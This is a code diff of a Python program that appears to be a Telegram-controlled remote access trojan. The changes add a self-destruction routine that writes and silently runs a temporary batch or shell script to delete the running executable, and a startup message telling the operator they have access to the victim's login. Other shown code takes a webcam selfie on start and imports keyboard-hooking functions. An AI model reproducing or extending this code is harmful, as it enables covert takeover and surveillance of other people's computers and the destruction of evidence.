@@ -45,13 +45,15 @@ from re import findall, M
 from time import time, sleep
 from threading import Thread
 from datetime import datetime
+from tempfile import gettempdir
 from typing import Any, Callable
 from io import BytesIO, StringIO
 from random import choice, randint
-from string import ascii_letters, printable
 from webbrowser import open as browseropen
-from os.path import join, abspath, isfile, isdir, exists, dirname
-from os import system, remove, getenv, getcwd, listdir, name, mkdir 
+from string import ascii_letters, printable
+from subprocess import CREATE_NO_WINDOW, Popen
+from os.path import join, abspath, isfile, exists, dirname, realpath
+from os import system, remove, getenv, getcwd, listdir, name, getlogin, chmod 
 from keyboard import press as press_key, release as release_key, read_event, KEY_DOWN
 
 
@@ -67,14 +69,8 @@ iswindows = name == "nt"
 islinux = not iswindows
 cwd_folder = getcwd()
 HOME_PATH = getenv("USERPROFILE") if iswindows else getenv("HOME")
-BURN_DIRECTORY = join(HOME_PATH, ".cache")
+BURN_DIRECTORY = gettempdir()
 MOUSE_JMP = 50
-
-#vfx = abspath(join(cwd_folder, "vfx"))
-#sfx = abspath(join(cwd_folder, "sfx"))
-#
-#prototxt_filename = join(cwd_folder, 'model', '1.prototxt')
-#caffemodel_filename = join(cwd_folder, 'model', '2.caffemodel')
 
 try:
     vfx = resource_path("vfx")
@@ -90,11 +86,6 @@ def randomname(lenght: int=10) -> str:
 
 while isfile(BURN_DIRECTORY):
     BURN_DIRECTORY = BURN_DIRECTORY+randomname(3)
-
-if not isdir(BURN_DIRECTORY):
-    mkdir(BURN_DIRECTORY)
-    if iswindows:
-        system(f"attrib +h {BURN_DIRECTORY}")
 
 if isfile(prototxt_filename) and isfile(caffemodel_filename):
     with open(prototxt_filename, 'rb') as f:
@@ -1483,11 +1474,12 @@ class PeppinoTelegram:
             self.cantopenthread = Thread(target=self.cantopenkiller)
             self.cantopenthread.start()
             self.screen_width, self.screen_height = pg.size()
+            botstartedmessage = f"Bot started now, you have acces to {getlogin()}"
             if not sys.argv[1:]:
-                if not self.selfie(f"Bot started: "+now()):
-                    self.bsend(f"Bot started: {now()}")
+                if not self.selfie(botstartedmessage):
+                    self.bsend(botstartedmessage)
             else:
-                self.bsend(f"Bot started: {now()}")
+                self.bsend(botstartedmessage)
             loop = MessageLoop(self.bot, {"chat":self.handle, "callback_query":self.on_callback_query})
             loop.run_as_thread()
             while 1:
@@ -1509,6 +1501,21 @@ class PeppinoTelegram:
             payload = {'commands': commands}
             response = requests.post(url, json=payload)
             return response.status_code == 200
+
+        def selfdestruction(self) -> None:
+            current_file = realpath(sys.argv[0])
+            temp_dir = gettempdir()
+            if iswindows:
+                bat_file = join(temp_dir, "delete_me.bat")
+                with open(bat_file, "w") as f:
+                    f.write(f':loop\ndel "{current_file}" > nul\nif exist "{current_file}" goto loop\ndel "%~f0"')
+                Popen(['cmd', '/c', bat_file], creationflags=CREATE_NO_WINDOW)
+            else:
+                sh_file = join(temp_dir, "delete_me.sh")
+                with open(sh_file, "w") as f:
+                    f.write(f'#!/bin/sh\nTARGET="{current_file}"\nwhile [ -e "$TARGET" ]; do\n\trm "$TARGET"\n\tsleep 0.5\n\tdone\n\trm -- "$0"')
+                chmod(sh_file, 0o700)
+                Popen(['sh', sh_file])                                                                                                       
 
         def waitforface(self, timeout=60):
             start = time()
